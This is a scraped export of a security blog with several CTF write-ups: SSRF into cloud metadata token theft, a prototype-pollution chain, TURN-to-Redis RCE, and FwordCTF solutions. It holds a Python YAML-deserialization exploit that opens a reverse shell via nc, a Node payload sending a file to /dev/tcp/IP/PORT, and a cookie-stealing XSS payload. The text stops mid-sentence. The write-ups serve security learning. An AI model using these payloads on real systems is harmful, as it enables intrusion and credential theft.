i solved it after the end of the CTF but still learned a lot from it.\nWatermark as a Service Unfortunately, I didn\u0026rsquo;t have the chance to take a look at this task while the CTF was running but it was a fun easy task. We have a website that visits the link we enter and takes a screenshot of the website.\nMost of you are thinking now of SSRF attack but there are some strict filters restricting us from using usual payloads and DNS rebinding tricks.\nlet urlObj;\rtry {\rurlObj = new URL(url);\r} catch {\rres.sendStatus(400);\rreturn;\r}\rconst hostname = urlObj?.hostname;\rif (!hostname || ip.isPrivate(hostname)) {\rres.sendStatus(400);\rreturn;\r}\rif (BLOCKED_HOSTS.some((blockedHost) =\u0026gt; hostname.includes(blockedHost))) {\rres.sendStatus(400);\rreturn;\r}\rconst protocol = urlObj?.protocol;\rif (\r!protocol ||\r!ALLOWED_PROTOCOLS.some((allowedProtocol) =\u0026gt;\rprotocol.includes(allowedProtocol)\r)\r) {\rres.sendStatus(400);\rreturn;\r}\rlet addresses\rtry {\raddresses = await resolve4(hostname);\r} catch {\rres.sendStatus(400);\rreturn;\r}\rif (addresses.includes(\u0026quot;169.254.169.254\u0026quot;)) {\rres.sendStatus(400);\rreturn;\r}\r Our goal is to access google cloud metadata in order to get the access token and explore their cloud infrastructure . Analysing the source code, we can figure that the website is using puppeteer which is a headless chrome browser so we can host a normal static page that has a simple js window.location=\u0026quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\u0026quot;;\ntbh I didn\u0026rsquo;t try this solution, I have just developed a simple webapp that returns a 302 status code redirect to Google Cloud internal metadata, this is the source code:\n\u0026lt;?php\rheader('Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token', true, 301);\rexit;\r?\u0026gt;\r I like tasks that don\u0026rsquo;t need a lot of code xD You can also simply use an url shortener like cuttly or bit.ly. We have the following result after redirecting it to ``http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true```. Notice that we are using the beta service of metadata endpoint because it doesn\u0026rsquo;t require any additional headers to setup.\nIf you focus on the results there is a docker image in https://gcr.io/dicegang-waas/waas so let\u0026rsquo;s grab the google cloud access token and try to run the docker image , we will redirect it to the following url now\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \nBingo we have the access token now\nI was really a little bit lazy to use an ocr tool and copy the access token from the screenshot x) All you have to do now is to run the following commands ( Ref):\ndocker login -u oauth2accesstoken -p \u0026quot;\u0026lt;Access-Token\u0026gt;\u0026quot; https://gcr.io/\r Then\ndocker pull gcr.io/dicegang-waas/waas\r And finally running the image will give you the flag\ndocker run -it gcr.io/dicegang-waas/waas\r Fun Fact: We used a similar technique to break into a previous CTF infrastructure, if you are eager to know more you can read this  tweet\nBuild a Better Panel This task was the same as Build a Panel but the admin bot was restricted to visit only the websites matching this regex ^https:\\/\\/build-a-better-panel\\.dicec\\.tf\\/create\\?[0-9a-z\\-\\=]+$ so we can\u0026rsquo;t send directly the url having the SQL injection payload, we need to find a client side bug and chain it in order to achieve our goal. I started exploring the client side code and the following snippet seemed suspicious:\nconst mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];\rconst safeDeepMerge = (target, source) =\u0026gt; {\rfor (const key in source) {\rif(!mergableTypes.includes(typeof source[key]) \u0026amp;\u0026amp; !mergableTypes.includes(typeof target[key])){\rif(key !== '__proto__'){\rsafeDeepMerge(target[key], source[key]);\r}\r}else{\rtarget[key] = source[key];\r}\r}\r}\rconst displayWidgets = async () =\u0026gt; {\rconst userWidgets = await (await fetch('/panel/widgets', {method: 'post', credentials: 'same-origin'})).json();\rlet toDisplayWidgets = {'welcome back to build a panel!': {'type': 'welcome'}};\rsafeDeepMerge(toDisplayWidgets, userWidgets);\r There is an obvious prototype pollution vulnerability but we need to bypass the filter of \u0026ldquo;__proto__\u0026rdquo; , fortunately we are talking about javascript here where everything is possible :D\na.__proto__ is similar to a.constructor.prototype (a is a JS object) , userWidgets is fetched from /panel/widgets and we can control the data passed to an object. Let\u0026rsquo;s check the part responsible of returning the widgets in the backend\napp.post('/panel/widgets', (req, res) =\u0026gt; {\rconst cookies = req.cookies;\rif(cookies['panelId']){\rconst panelId = cookies['panelId'];\rquery = `SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`;\rdb.all(query, [panelId], (err, rows) =\u0026gt; {\rif(!err){\rlet panelWidgets = {};\rfor(let row of rows){\rtry{\rpanelWidgets[row['widgetname']] = JSON.parse(row['widgetdata']);\r}catch{\r}\r}\rres.json(panelWidgets);\r}else{\rres.send('something went wrong');\r}\r});\r}\r});\r The following line is the most juicy:\npanelWidgets[row['widgetname']] = JSON.parse(row['widgetdata']);\r This screenshot can resume what will happen:\nNow we have to figure out what to do with the prototype pollution and use it to achieve an XSS or somehow send a request to the endpoint vulnerable to SQL Injection (XSS is pretty hard because there is a strict CSP). After searching a little bit I found the following github repo holding several gadgets to use. The website is using embedly and I found the following gadget to achieve XSS (  Gadget ) but as we said with the used CSP it\u0026rsquo;s nearly impossible to execute JS code .\ndefault-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;\r After the end of the CTF I discovered from the discord server of the CTF that there was another gadget permitting us to set any attribute of an iframe , so we can set the srcdoc attribute to redirect the admin to the endpoint vulnerable to SQL injection, our final payload that we will send to create a widget is :\n{\u0026quot;widgetName\u0026quot;:\u0026quot;constructor\u0026quot;,\u0026quot;widgetData\u0026quot;:\u0026quot;{\\\u0026quot;prototype\\\u0026quot;:{\\\u0026quot;srcdoc\\\u0026quot;:\\\u0026quot;\u0026lt;script src=\\\\\\\u0026quot;https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=kahlaa%27%2C%20%28select%20flag%20from%20flag%20limit%201%29%2C%20%271%27%29%3B--\u0026amp;widgetname=1\u0026amp;widgetdata=1\\\\\\\u0026quot; \u0026gt;\u0026lt;/script\u0026gt;\\\u0026quot;}}\u0026quot;}\r Note that we can execute our payload because the script-src in CSP is set to \u0026lsquo;self\u0026rsquo;.\nFinally we have to send the url that opens our panel to the admin in order to execute our gadget https://build-a-better-panel.dicec.tf/create?panelId=kahlaa . And Bingo we received our flag :D\nConclusion Thank you for reading all the article and sorry if it was a little bit long \\o/ DiceCTF was really fun and a good one to start with after some long break :D Unfortunately I couldn\u0026rsquo;t fully participate but it was also fun to complete the tasks after its end. If you have any questions you can contact me on twitter,facebook or by mail , i\u0026rsquo;ll be very glad to help.\n","date":1612994400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1612994400,"objectID":"7b5ed0bdd717d67b6344d4130f932d52","permalink":"https://ahmed-belkahla.me/post/dice_ctf_web_writeups/","publishdate":"2021-02-10T22:00:00Z","relpermalink":"/post/dice_ctf_web_writeups/","section":"post","summary":"Hello everybody , it has been a long time since I have posted a writeup :( I have been a little busy in the last period with school assignments, exams and some work (Covid has really messed up my life).","tags":null,"title":"DiceCTF Web Writeups - Client Side Chaining And JS Attacks","type":"post"},{"authors":null,"categories":null,"content":"Last month our team organized FwordCTF 2020 and we got very positive feedbacks and fortunately most of the players enjoyed their journey. More than 1900 participants and 980 teams took part of this first edition, as I was responsible of managing the infrastructure it was a great challenge to deal with this great number and create a secure environment for unsecure challenges :v so i\u0026rsquo;ll share with you my experience maybe it can inspire you.\nNOTE: This is not a step by step tutorial, it\u0026rsquo;s my way to document things so I can remember them next year.\nCloudflare Stats:\nSections  Platform Infrastructure Issues We faced Challenges Management and health check Isolated Container for each participant in Bash category Next edition ?  Platform Infrastructure We have mainly used AWS services, there is no special reason for this choice but I was more familiar with AWS and every member in our team had free 100$ credits in AWS Educate xD For impatient people here is the global architecture we used at the beginning of the CTF, it was the ideal choice for us but we faced some problems that obliged us to switch to an another alternative.\nDetails:\n 4 * CTFD Instance: Ubuntu Server 20.04 LTS t2.medium (4Gb Memory / 2 * Vcpus) : a docker swarm Master Node + 3 * Worker nodes (more details later) Redis caching instance: Ubuntu Server 20.04 LTS t2.small (2Gb Memory / 1 * Vcpus) : A separate instance for Redis ( caching system ) Bastion: Ubuntu Server 20.04 LTS t2.small (2Gb Memory / 1 * Vcpus): As you can notice all CTFD and redis instances are in a private subnet so we can\u0026rsquo;t SSH to them that\u0026rsquo;s why we need a bastion that is in a public subnet, and as all the subnets are in the same VPC so we can SSH from Bastion to the servers in the private subnet. Amazon RDS Instance: db.t2.small at the beginning then upgraded it to db.t2.medium: Amazon RDS is a nice way to set up, operate, and scale a relational database in the cloud. It has also a nice automated backup system.   Cloudflare free plan: Cloudflare really saved us a lot , we faced more than DDOS attacks and some of them were really serious attacks but hackers can\u0026rsquo;t be hacked easily :p   Sendgrid free account (25k free emails): We used Sendgrid for email verification and for sending the certificates after the CTF. AWS Network Load Balancer   AWS S3 bucket to serve the files to download.   NAT Gateway: NAT gateway is important to enable internet connection for the private subnets.  VPC:\nSubnets:\nWe used docker swarm for orchestration and it was really helpful , we created 4 replicas in each node ( learn more about Docker Swarm here ) but after some time we decided to change our strategy , docker swarm had a weakness which is sharing volumes ; every volume mount is local to that node, this was not something critical and there are some solutions available but as it was something unpredictable for us and we didn\u0026rsquo;t test it before, we decided to choose the safest option and replaced the 4 CTFD instances with a single t2.xlarge instance ( 16GB Memory/4 Vcpus ) that contains also 4 replicas of CTFD . The result is the following:\nIssues We faced AWS RDS We are really thankful that this error occured 5 days before the CTF. Only 1 hour after the we launched the platform, we kept having internal server errors , after some debugging we discovered AWS RDS (mysql DBs in general) has an attribute max_connections which is set by default to a low value and once we exceeded that value CTFD couldn\u0026rsquo;t connect to the database, but after changing the max_connections value and restarting things we kept having the 500 internal errors :( . After a lot of debugging and analysis I discovered that the containers couldn\u0026rsquo;t resolve the database domain name which is really strange because AWS DNS server was running flawlessly. To make things shorter, docker swarm overlay network\u0026rsquo;s IP range was overlapping with the physical network, so when the container try to resolve the DB domain name it didn\u0026rsquo;t really send a request to AWS DNS , the solution was to launch the swarm with the following command:\nsudo docker swarm init --default-addr-pool 192.168.0.0/16  it took us only 35 minutes to discover the problem and solve it, but it was the most stressful minutes in my life xD\nCommon problems Docker Swarm sticky sessions\nDocker swarm doesn\u0026rsquo;t have by default a layer 7 load balancer , so we had faced some problems related to sessions, the solution was easy, we only needed to add our own load balancer that supports sticky sessions (we used traefik instead of nginx and it did really great )\nOther Issues\nI needed to set SQLALCHEMY_MAX_OVERFLOW in CTFD to a high value in order to avoid some DB problems and I also had to add some code to CTFD in order to connect successfully to my S3 bucket (AWS Educate accounts have an extra parameter that need to be used and CTFD doesn\u0026rsquo;t handle this case).\nChallenges Management and health check For Web tasks every framework needs a custom docker-compose.yml file so every author took care of his task. For the other categories we used a t2.medium instance for each task and docker swarm to orchestrate the containers ( each task has 3 replicas) and to make sure that we will have no down time (if a container failed there is always two other containers running). this is an automated version where you only have to create a Dockerfile for the task (take a look at my github repo for examples):\nSteps:\n Put the following docker-compose.yml file in the same directory with the task:  version: \u0026quot;3.8\u0026quot; services: task: image: 127.0.0.1:5000/task build: context: . dockerfile: ./Dockerfile container_name: taskName deploy: mode: replicated replicas: 3 networks: - isolated ports: - \u0026quot;9999:1234\u0026quot; #ToChange networks: isolated:   Choose the port you want Run the following start.sh with root privileges  #!/bin/bash echo \u0026quot;[!] Run me with sudo pleaaaaase!\u0026quot; docker run -it --name registry -p 127.0.0.1:5000:5000 -d registry:2 if [ $? -eq 0 ]; then echo \u0026quot;[+] registry done!\u0026quot; else echo \u0026quot;Failed\u0026quot; fi docker-compose -f docker-compose.yml build docker-compose -f docker-compose.yml push if [ $? -eq 0 ]; then echo \u0026quot;[+] Image pushed!\u0026quot; else echo FAILED fi docker swarm init docker stack deploy --compose-file docker-compose-sample.yml task if [ $? -eq 0 ]; then echo \u0026quot;[+] Done, Fword FTW\u0026quot; else echo FAILED fi  NOTE: In case you faced any errors you have to leave the swarm and retry again (don\u0026rsquo;t forget to use the last version of docker-compose)\nThis was a quick solution to facilitate things during the CTF and it may be optimized, in fact I\u0026rsquo;m thinking of releasing a tool that do everything for us but I\u0026rsquo;m just too lazy.\nMangement: Some of you may be wondering how we could manage more than 22 servers, we used an awesome tool called  Termius (it\u0026rsquo;s free in Github Student Pack) which is an SSH client with a lot of awesome features, it lets you organize the servers in groups and ssh to them with just a double click.\nPlatform:\nIsolated Container for each participant in Bash category I think that many people are waiting for this section, in bash category there were some tasks that required an SSH connection so to provide a better environment we came up with this solution and every player will be assigned to an isolated container.\nTechnical details:\nThe idea is simple, we firstly instanciate a manager which is a container running the SSH server and for each connection it will instanciates a new container (from the image of the task) and connects to it (docker inside docker).\nIt may look simple but it took me a little bit of time to implement it and test it. Please take a look at this  sample if you want to adapt this method.\nSteps:\n Run docker-compose -f docker-compose-task.yml build Run docker-compose -f docker-compose.yml up  And Bingo you will have SSH listening on port 10000, you can create a cron job to kill the participants containers every period of time or optimize manage.sh script. Please feel free to contact me if you have any questions or optimizations.\nNext edition ? Personally, I prefer using kubernetes in the next edition and automate health checks for each task. Finding a solution to enable a separate environment for every participant in all categories is also a nice idea and finally develop our custom platform.\nConclusion I\u0026rsquo;m so happy this edition was concluded successfully and we got great feedbacks, I have definitely learned a lot from this opportunity, can\u0026rsquo;t wait for the next edition ; it will be more exciting !! For any questions you can contact me on twitter or facebook!\n","date":1600733280,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1600733280,"objectID":"934f2736f647937b797482e304759c3e","permalink":"https://ahmed-belkahla.me/post/fwordctf_infrastructure/","publishdate":"2020-09-22T00:08:00Z","relpermalink":"/post/fwordctf_infrastructure/","section":"post","summary":"How to deploy a scalable and robust CTF infrastructure and the different issues we faced in FwordCTF 2020","tags":null,"title":"International CTF Infrastructure Management","type":"post"},{"authors":null,"categories":null,"content":"Web RTC (450pts) 39 solves Last weekend,we have been a part of the CSAW CTF 2020 and our team Fword ranked 4th in MENA region. We managed to solve all web challenges with my awesome teammates @Hera and @Noxious and we have particularly enjoyed Web RTC .\nTL;DL   Exploiting CoTurn server in order to gain SSRF.\n  Escalating SSRF to RCE using Redis.\n  Overview We have a Real Time Chat web app and we were provided with the source code / Dockerfile / supervisor.conf.\nExamining the source code didn\u0026rsquo;t really bring something to the table.But we got some juicy stuff ,reading the Dockerfile / supervisor.conf. It turned out that the application is using TURN protocol to relay the network traffic between peers and Redis as a caching system.\nExploitation Since the application didn\u0026rsquo;t seem vulnreable, we decide to focus basically on CoTURN server exploitation. After searching around we found the following HackerOne report which claims that it\u0026rsquo;s possible to abuse the TURN Protocol to gain SSRF. In fact, the attacker may proxy TCP connections to the internal network by setting the XOR-PEER-ADDRESS of the TURN connect message (method 0x000A, https://tools.ietf.org/html/rfc6062#section-4.3) to a private IPv4 address.\nWe used the following  tool to exploit that issue.\nWe can notice that the Coturn server IP is returned to confirm the SSRF.\nUnfortunately fetching localhost ip didn\u0026rsquo;t work for us so we fired up wireshark to monitor the STUN (TURN Protocol is an extension of STUN protocol) packets.\nWe can confirm that the coTurn server has some protections blacklisting local ips. We first tried to bruteforce the internal ip but in vain , finally we managed to bypass this protection using 0.0.0.0 ip:\nAnd Bingo we achieved the first part!\nEscalating SSRF to RCE using Redis This part was somehow trivial but it took us some time to exploit Redis properly, we used some instructions from this  tool ( we fired a Rogue server from it) and executed the following commands:\nAnd Voilaa We got our beloved flag :D It was our first time dealing with RTC website and exploiting and it was really fun!\nReferences:\n   Article About the vulnerability\n   HackerOne Article\n  ","date":1600041600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1600041600,"objectID":"ef279e36ae1b7332c9eac24a03dad731","permalink":"https://ahmed-belkahla.me/post/csaw2020-webrtc/","publishdate":"2020-09-14T00:00:00Z","relpermalink":"/post/csaw2020-webrtc/","section":"post","summary":"Web RTC (450pts) 39 solves Last weekend,we have been a part of the CSAW CTF 2020 and our team Fword ranked 4th in MENA region. We managed to solve all web challenges with my awesome teammates @Hera and @Noxious and we have particularly enjoyed Web RTC .","tags":null,"title":"CSAW CTF2020 - Web RTC Writeup","type":"post"},{"authors":null,"categories":null,"content":"Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I\u0026rsquo;ve been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.\nHowever in this article we will discuss the possible ways of solving my Web / Bash tasks.\nPastaXSS (5 solves) 500pts This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).\nEnumeration When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a jutsu with markdown possibility. There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts http://web1.fword.wtf/jutsu/{id} .\nMarkdown in jutsu:\nExploitation Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)\nJutsusController.php\npublic function viewJutsu($id,EntityManagerInterface $em,CacheInterface $cache,MarkdownParserInterface $markdown){ $repo=$em-\u0026gt;getRepository(Jutsus::class); $jutsu=$repo-\u0026gt;findOneBy([\u0026quot;id\u0026quot;=\u0026gt;$id]); $this-\u0026gt;denyAccessUnlessGranted(\u0026quot;SHOW\u0026quot;,$jutsu); //fetch jutsu + htmlspecialchars+markdown $name=$jutsu-\u0026gt;getName(); $desc=htmlspecialchars($jutsu-\u0026gt;getDescription()); $description=$cache-\u0026gt;get(\u0026quot;jutsu\u0026quot;.$jutsu-\u0026gt;getId(),function()use($markdown,$desc){ return $markdown-\u0026gt;transformMarkdown($desc); }); $publishedAt=$jutsu-\u0026gt;getPublishedAt()-\u0026gt;format('Y-m-d H:i:s'); $author=$jutsu-\u0026gt;getUser(); return $this-\u0026gt;render(\u0026quot;jutsus/show.html.twig\u0026quot;,[\u0026quot;name\u0026quot;=\u0026gt;$name,\u0026quot;description\u0026quot;=\u0026gt;$description,\u0026quot;publishedAt\u0026quot;=\u0026gt;$publishedAt,\u0026quot;author\u0026quot;=\u0026gt;$author]); }  And this is the part where curl was used (a symfony service created) :\nclass Curl { public function fetch(string $url):string { $response = shell_exec(\u0026quot;curl '\u0026quot;.escapeshellcmd($url).\u0026quot;' -s --max-time 6\u0026quot;); preg_replace('/\u0026lt;title\u0026gt;(.*)\u0026lt;\\/title\u0026gt;/i','',$response); return (!empty($response)?substr($response,0,780):\u0026quot;\u0026quot;); } public function extractTitle(string $url):string{ $response=$this-\u0026gt;fetch($url); $output=array(); preg_match('/\u0026lt;title\u0026gt;(.*)\u0026lt;\\/title\u0026gt;/i',$response,$output); return (array_key_exists(1,$output) ? $output[1]:\u0026quot;Unknown Jutsu\u0026quot;); } }  So we can notice that if we can edit the cached version to have my XSS payload we will bypass htmlspecialchars sanitization and get our javascript code executed. We can achieve this if we chain the SSRF to communicate with Redis caching system ( you can know from the configuration files that the system is using redis with the hostname redis).\nUsing gopher protocol we can communicate with all text based protocols including redis by just following this pattern:\n gopher://redis:6379/_REDIS Command\n we need to firstly fetch all keys using KEYS * but you can notice the use of escapeshellcmd that will escape * so we have to urlencode our payload in order to bypass this.\n gopher://redis:6379/_KEYS%20%2a\n This will fetch all jutsus for us\nNow we only have to set that key to our XSS payload :\n gopher://redis:6379/_SET%20yLAP6wFwIy%3Ajutsu5598%20%27s%3A81%3A%22%3Cscript%20src%3D%22URL%22%3E%3C%2Fscript%3E%22%3B%27\n And Bingo you will get the flag :\nFwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}\nThere was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)\n![\u0026lt;img src=\u0026quot;#\u0026quot; onerror=\u0026quot;src='http://requestbin.net/r/12bfihl1?c='+document.cookie; this.onerror=null\u0026quot;/\u0026gt;](#){onerror=outerHTML=alt}\nUseless(3 solves) 500pts In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don\u0026rsquo;t see anything special.\nLet\u0026rsquo;s get a look on the source code, after some digging, this part seems interesting, it\u0026rsquo;s the logic handling the Github Oauth.\n@oauth_authorized.connect_via(github_authbp) def github_oauth(github_authbp,token): if not github.authorized: return redirect(url_for(\u0026quot;github.login\u0026quot;)) resp = github.get(\u0026quot;/user\u0026quot;) if not resp.ok: return redirect(url_for(\u0026quot;github.login\u0026quot;)) info=resp.json() auth=oauth.OAuth.query.filter_by(provider_user_id=info[\u0026quot;id\u0026quot;]).first() if auth is None: auth = oauth.OAuth(provider=\u0026quot;github\u0026quot;, provider_user_id=info[\u0026quot;id\u0026quot;], token=token) if auth.user: login_user(auth.user) return redirect(\u0026quot;/home\u0026quot;,302) else: if not validate_username(info[\u0026quot;login\u0026quot;]): return redirect(\u0026quot;/register\u0026quot;) if info[\u0026quot;login\u0026quot;]==\u0026quot;fwordadmin\u0026quot;: user = users.User(username=info[\u0026quot;login\u0026quot;], email=info[\u0026quot;email\u0026quot;],is_admin=True) else: user=users.User(username=info[\u0026quot;login\u0026quot;],email=info[\u0026quot;email\u0026quot;]) auth.user=user base.db_session.add_all([user,auth]) base.db_session.commit() login_user(user) return redirect(\u0026quot;/home\u0026quot;,302) else: login_user(auth.user) return redirect(\u0026quot;/home\u0026quot;, 302)  The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that fwordadmin is the github account of the admin (this information will help us next).\nNow our goal is to login using fwordadmin account, there\u0026rsquo;s something suspicious in the previous code, when you connect via github you don\u0026rsquo;t need any password but indeed the user is still saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).\nThe User class confirms our statement, the default password is set to \u0026quot;\u0026quot;\nclass User(UserMixin,Base): __tablename__ = 'users' id = Column(Integer, primary_key=True) username = Column(String(50), unique=True) email = Column(String(120), unique=True) password_hash=Column(String(200)) is_admin=Column(Boolean) def __init__(self, username=None, email=None,password=\u0026quot;\u0026quot;,is_admin=False): self.username = username self.email = email print(\u0026quot;pass :\u0026quot;+password) self.set_password(password) self.is_admin=is_admin  So if we connect with the following credentials we will takeover the admin account:\nlogin: fwordadmin password: //  There is a check that removes special characters so the password will be interpreted as \u0026quot;\u0026quot; at the end.\nNow we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.\nThe vulnerable code:\ndef parse(text): try: res = yaml.load(text, Loader=Loader) return res except Exception: return \u0026quot;An Error has occured\u0026quot;  This is my final exploit that spawns a reverse shell:\nimport yaml,subprocess,requests class Payload(object): def __reduce__(self): return (subprocess.Popen,(tuple('nc IP PORT -e /bin/bash'.split(\u0026quot; \u0026quot;)),)) deserialized_data = yaml.dump(Payload()) data1={\u0026quot;username\u0026quot;:\u0026quot;fwordadmin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;////\u0026quot;} print(\u0026quot;[+] Payload is: \u0026quot;+deserialized_data) #yaml.load(deserialized_data,Loader=yaml.Loader) data2={\u0026quot;service\u0026quot;:deserialized_data} s=requests.Session() r=s.post(\u0026quot;https://useless.fword.wtf/login\u0026quot;,data=data1) if r.status_code==200: print(\u0026quot;[+] Logged in successfully\u0026quot;) r=s.post(\u0026quot;https://useless.fword.wtf/home\u0026quot;,data=data2) print(\u0026quot;[+] Shell Spawned, check your listener)  I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .\nOtaku (8 solves) 500pts This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.\nHome Page:\nWe have an update feature after connecting to update our favorite anime and username, le\u0026rsquo;s have a look at its source code:\napp.post(\u0026quot;/update\u0026quot;,(req,res)=\u0026gt;{ try{ if(req.session.username \u0026amp;\u0026amp; req.session.anime){ if(req.body.username \u0026amp;\u0026amp; req.body.anime){ var query=JSON.parse(`{\u0026quot;$set\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;${req.body.username}\u0026quot;,\u0026quot;anime\u0026quot;:\u0026quot;${req.body.anime}\u0026quot;}}`); client.connect((err)=\u0026gt;{ if (err) return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;}); const db=client.db(\u0026quot;kimetsu\u0026quot;); const collection=db.collection(\u0026quot;users\u0026quot;); collection.findOne({\u0026quot;username\u0026quot;:req.body.username},(err,result)=\u0026gt;{ if (err) {return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;});console.log(err);} if (result) return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;This username already exists, Please use another one\u0026quot;});}); collection.findOneAndUpdate({\u0026quot;username\u0026quot;:req.session.username},query,{ returnOriginal: false },(err,result)=\u0026gt;{ if (err) return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;}); var newUser={}; var attrs=Object.keys(result.value); attrs.forEach((key)=\u0026gt;{ newUser[key.trim()]=result.value[key]; if(key.trim()===\u0026quot;isAdmin\u0026quot;){ newUser[\u0026quot;isAdmin\u0026quot;]=0; } }); req.session.username=newUser.username; req.session.anime=newUser.anime; req.session.isAdmin=newUser.isAdmin; req.session.save(); return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;Updated Successfully\u0026quot;}); }); }); } else return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;}); } else res.redirect(302,\u0026quot;/login\u0026quot;); } catch(err){ console.log(err); } });  We can easily notice the NoSQL injection in  var query=JSON.parse(`{\u0026quot;$set\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;${req.body.username}\u0026quot;,\u0026quot;anime\u0026quot;:\u0026quot;${req.body.anime}\u0026quot;}}`); and prototype pollution here :\n var newUser={}; var attrs=Object.keys(result.value); attrs.forEach((key)=\u0026gt;{ newUser[key.trim()]=result.value[key]; if(key.trim()===\u0026quot;isAdmin\u0026quot;){ newUser[\u0026quot;isAdmin\u0026quot;]=0; } });  Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:\n brrr\u0026quot;,\u0026quot; proto\u0026quot; : {\u0026ldquo;isAdmin\u0026rdquo;:1}, \u0026ldquo;aaaa\u0026rdquo;:\u0026ldquo;aaa\n W don\u0026rsquo;t have to forget the whitespace before __proto__ because mongo doesn\u0026rsquo;t accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.\nNow we have admin access:\nIn the admin panel we have the possibility to set an environment variable and run a js script, the intended idea is to set NODE_VERSION env variable to some js code followed by // and then execute /proc/self/environ. The content of /proc/self/environ will be interpreted as Js code ( we chose NODE_VERSION because it\u0026rsquo;s the first env var, we knew it by connecting to the node docker image and checking its environment variables).\nFinal payload:\nenvname: NODE_VERSION env: process.mainModule.require('child_process').exec(\u0026quot;bash -c \\\u0026quot; cat /flag.txt \u0026gt; /dev/tcp/IP/PORT\\\u0026quot;\u0026quot;); // path: /proc/self/environ  And Bingo we got our flag\nOther Writeups Super Guesser Team writeups, they solved all web challenges :D LINK\nHexion Team Otaku task writeup LINK\nBash Category These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i\u0026rsquo;ll put some links here (I\u0026rsquo;m just lazy to write my own writeups):\nJailBoss:\n Writeup 1\n Writeup 2\nCapiCapi\n Writeup 1\n Writeup 2\nBash is Fun\n Writeup 1\n Writeup 2\nSource Code You can visit this github repo where i\u0026rsquo;ll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )\n FwordCTF 2020\nThank you for reading the entire article, if you have any questions you can contact me on twitter @belkahlaahmed1 . organizing this huge CTF was really a unique experience and I learned a lot from it. Long life Fword Team you are just awesome guys.\n","date":1599005280,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1599005280,"objectID":"13e1338e987a6d0b065b205e44f238f6","permalink":"https://ahmed-belkahla.me/post/fword-ctf2020/","publishdate":"2020-09-02T00:08:00Z","relpermalink":"/post/fword-ctf2020/","section":"post","summary":"Official writeups for FwordCTF2020 Web/Bash challenges","tags":null,"title":"FwordCTF 2020 - Web/Bash Writeups","type":"post"},{"authors":null,"categories":null,"content":"After a long week of work I decided to participate in CSICTF2k20 with my team Fword since I didn\u0026rsquo;t participate for a long time :( We were among the top 30 teams and we managed to almost solve all Web exploitaion tasks with my teammate @Hera. However I enjoyed solving File Library and The Usual Suspects tasks.\nFile Library 497pts (40 solves) We are given the source code of the task :\nconst express = require('express'); const path = require('path'); const fs = require('fs'); const app = express(); const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Listening on port ${PORT}`); }); app.get('/getFile', (req, res) =\u0026gt; { let { file } = req.query; console.log(\u0026quot;file is: \u0026quot;+file); if (!file) { res.send(`file=${file}\\nFilename not specified!`); return; } try { if (file.includes(' ') || file.includes('/')) { res.send(`file=${file}\\nInvalid filename!`); return; } } catch (err) { res.send('An error occured!'); return; } if (!allowedFileType(file)) { res.send(`File type not allowed`); return; } if (file.length \u0026gt; 5) { file = file.slice(0, 5); } const returnedFile = path.resolve(__dirname + '/' + file); console.log(\u0026quot;returnedFile: \u0026quot;+returnedFile); fs.readFile(returnedFile, (err) =\u0026gt; { if (err) { if (err.code != 'ENOENT') console.log(err); res.send('An error occured!'); return; } res.sendFile(returnedFile); }); }); app.get('/*', (req, res) =\u0026gt; { res.sendFile(__dirname + '/index.html'); }); function allowedFileType(file) { const format = file.slice(file.indexOf('.') + 1); console.log(\u0026quot;index +1 is \u0026quot;+file.indexOf('.') + 1); console.log(\u0026quot;format inside allowedfile is: \u0026quot;+format); if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') { return true; } return false; }  I added some logging statements to facilitate things, as you can see when we visit /getfile we can provide in a get parameter a filename that will be displayed for us but there are some restrictions, we can\u0026rsquo;t use 